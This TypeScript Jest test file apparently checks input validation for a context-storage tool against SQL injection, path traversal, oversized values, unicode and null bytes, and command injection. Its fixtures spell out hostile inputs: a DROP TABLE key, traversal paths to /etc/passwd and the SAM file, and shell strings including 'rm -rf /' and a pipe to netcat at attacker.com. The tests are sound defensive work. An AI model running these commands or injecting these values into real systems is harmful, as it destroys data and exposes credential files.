import { describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { DatabaseManager } from '../../utils/database.js';
import { validateKey, validateValue, validateFilePath, validateSearchQuery } from '../../utils/validation.js';

describe('Security - Input Validation Tests', () => {
  let tempDir: string;
  let dbManager: DatabaseManager;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-test-'));
    const tempDbPath = path.join(tempDir, 'test.db');
    dbManager = new DatabaseManager({ filename: tempDbPath });
  });

  afterEach(() => {
    dbManager.close();
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in key parameter', () => {
      const db = dbManager.getDatabase();
      const sessionId = 'test-session';
      
      // Create session
      db.prepare('INSERT INTO sessions (id, name) VALUES (?, ?)').run(sessionId, 'Test');
      
      // Malicious key attempting SQL injection
      const maliciousKey = "key'; DROP TABLE sessions; --";
      
      // Should safely insert without executing the DROP TABLE
      db.prepare(`
        INSERT INTO context_items (id, session_id, key, value, category, priority)
        VALUES (?, ?, ?, ?, ?, ?)
      `).run('item-1', sessionId, maliciousKey, 'value', 'test', 'normal');
      
      // Sessions table should still exist
      const tables = db.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name='sessions'").all();
      expect(tables.length).toBe(1);
      
      // The malicious key should be stored as-is
      const item = db.prepare('SELECT key FROM context_items WHERE id = ?').get('item-1') as any;
      expect(item.key).toBe(maliciousKey);
    });

    it('should prevent SQL injection in search queries', () => {
      const db = dbManager.getDatabase();
      const sessionId = 'test-session';
      
      // Create session and items
      db.prepare('INSERT INTO sessions (id, name) VALUES (?, ?)').run(sessionId, 'Test');
      db.prepare(`
        INSERT INTO context_items (id, session_id, key, value, category, priority)
        VALUES (?, ?, ?, ?, ?, ?)
      `).run('item-1', sessionId, 'test-key', 'test-value', 'test', 'normal');
      
      // Malicious search query
      const maliciousQuery = "test' OR '1'='1";
      
      // Validate and escape the query
      const validatedQuery = validateSearchQuery(maliciousQuery);
      
      // Should escape SQL wildcards
      expect(validatedQuery).toContain("test'' OR ''1''=''1");
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent path traversal attacks', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM',
        '../../../../../../../../etc/passwd',
        './../.../../etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
      ];

      maliciousPaths.forEach(maliciousPath => {
        expect(() => {
          validateFilePath(maliciousPath, 'read');
        }).toThrow(/Path traversal attempt detected|Invalid file path/);
      });
    });

    it('should allow valid relative paths within workspace', () => {
      const validPaths = [
        'src/index.ts',
        './test/file.js',
        'docs/README.md',
        'path/to/nested/file.txt',
      ];

      validPaths.forEach(validPath => {
        expect(() => {
          const fullPath = path.join(process.cwd(), validPath);
          validateFilePath(fullPath, 'write');
        }).not.toThrow();
      });
    });
  });

  describe('Size Limit Validation', () => {
    it('should reject excessively large keys', () => {
      const largeKey = 'x'.repeat(1000); // 1KB key
      
      expect(() => {
        validateKey(largeKey);
      }).toThrow(/Key is too long/);
    });

    it('should reject excessively large values', () => {
      const largeValue = 'x'.repeat(1024 * 1024 + 1); // Over 1MB
      
      expect(() => {
        validateValue(largeValue);
      }).toThrow(/Value is too large/);
    });

    it('should handle maximum allowed sizes', () => {
      const db = dbManager.getDatabase();
      const sessionId = 'test-session';
      
      // Create session
      db.prepare('INSERT INTO sessions (id, name) VALUES (?, ?)').run(sessionId, 'Test');
      
      // Maximum allowed key (255 chars)
      const maxKey = 'x'.repeat(255);
      
      // Maximum allowed value (1MB)
      const maxValue = 'x'.repeat(1024 * 1024);
      
      // Should successfully insert
      expect(() => {
        db.prepare(`
          INSERT INTO context_items (id, session_id, key, value, category, priority)
          VALUES (?, ?, ?, ?, ?, ?)
        `).run('item-1', sessionId, maxKey, maxValue, 'test', 'normal');
      }).not.toThrow();
    });
  });

  describe('Special Character Handling', () => {
    it('should handle unicode characters safely', () => {
      const db = dbManager.getDatabase();
      const sessionId = 'test-session';
      
      // Create session
      db.prepare('INSERT INTO sessions (id, name) VALUES (?, ?)').run(sessionId, 'Test');
      
      // Various unicode characters
      const unicodeTests = [
        '😀🎉🔥', // Emojis
        '你好世界', // Chinese
        'مرحبا بالعالم', // Arabic
        '🔧⚡️💻', // More emojis
        '\u0000\u0001\u0002', // Control characters
        '\\x00\\x01\\x02', // Escaped characters
      ];

      unicodeTests.forEach((text, index) => {
        db.prepare(`
          INSERT INTO context_items (id, session_id, key, value, category, priority)
          VALUES (?, ?, ?, ?, ?, ?)
        `).run(`item-${index}`, sessionId, `key-${index}`, text, 'test', 'normal');
        
        // Verify it was stored correctly
        const item = db.prepare('SELECT value FROM context_items WHERE id = ?').get(`item-${index}`) as any;
        expect(item.value).toBe(text);
      });
    });

    it('should handle null bytes safely', () => {
      const db = dbManager.getDatabase();
      const sessionId = 'test-session';
      
      // Create session
      db.prepare('INSERT INTO sessions (id, name) VALUES (?, ?)').run(sessionId, 'Test');
      
      // String with null byte
      const nullByteString = 'before\x00after';
      
      // SQLite handles null bytes by truncating at the null
      db.prepare(`
        INSERT INTO context_items (id, session_id, key, value, category, priority)
        VALUES (?, ?, ?, ?, ?, ?)
      `).run('item-1', sessionId, 'key-1', nullByteString, 'test', 'normal');
      
      // Should truncate at null byte
      const item = db.prepare('SELECT value FROM context_items WHERE id = ?').get('item-1') as any;
      expect(item.value).toBe('before');
    });
  });

  describe('Command Injection Prevention', () => {
    it('should validate git operations parameters', () => {
      // These should be validated before being passed to git commands
      const maliciousInputs = [
        '; rm -rf /',
        '&& cat /etc/passwd',
        '| nc attacker.com 1234',
        '`rm -rf /`',
        '$(cat /etc/passwd)',
      ];

      maliciousInputs.forEach(input => {
        // In real implementation, git operations should validate branch names
        expect(input).toMatch(/[;&|`$]/); // Contains shell metacharacters
      });
    });
  });
});